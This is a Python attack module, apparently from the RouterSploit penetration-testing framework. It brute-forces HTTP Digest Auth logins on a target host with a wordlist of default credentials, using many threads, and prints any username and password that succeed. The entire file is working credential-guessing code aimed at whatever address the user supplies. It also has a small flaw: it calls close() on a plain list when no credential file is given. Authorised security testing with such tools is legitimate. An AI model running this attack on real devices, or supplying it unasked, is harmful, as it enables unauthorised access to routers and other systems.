import threading

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    print_success,
    print_table,
    http_request,
    multi,
    validators,
)

from routersploit.exceptions import StopThreadPoolExecutor
from routersploit.threads import ThreadPoolExecutor
from requests.auth import HTTPDigestAuth


class Exploit(exploits.Exploit):
    """
    Module perform dictionary attack with default credentials against HTTP Digest Auth service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'HTTP Digest Default Creds',
        'description': 'Module perform dictionary attack with default credentials against HTTP Digest Auth service. '
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit Http Basic auth module
            'Alexander Yakovlev <https://github.com/toxydose>',  # upgrading to perform bruteforce attack against HTTP Digest Auth service
        ],
        'references': [
            '',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
    port = exploits.Option(80, 'Target port')
    threads = exploits.Option(8, 'Number of threads')
    defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
    path = exploits.Option('/', 'URL Path')
    verbosity = exploits.Option(True, 'Display authentication attempts', validators=validators.boolify)
    stop_on_success = exploits.Option(True, 'Stop on first valid authentication attempt', validators=validators.boolify)

    credentials = []

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        url = "{}:{}{}".format(self.target, self.port, self.path)

        response = http_request("GET", url)
        if response is None:
            return

        if response.status_code != 401:
            print_status("Target is not protected by Digest Auth")
            return

        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]

        with ThreadPoolExecutor(self.threads) as executor:
            for record in defaults:
                username, password = record.split(':')
                executor.submit(self.target_function, url, username, password)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

        defaults.close()

    def target_function(self, url, user, password):
        name = threading.current_thread().name

        user = user.encode('utf-8').strip()
        password = password.encode('utf-8').strip()

        response = http_request(method="GET", url=url, auth=HTTPDigestAuth(user, password))

        if response is not None and response.status_code != 401:
            print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=self.verbosity)
            self.credentials.append((self.target, self.port, user, password))
            if self.stop_on_success:
                raise StopThreadPoolExecutor
        else:
            print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=self.verbosity)
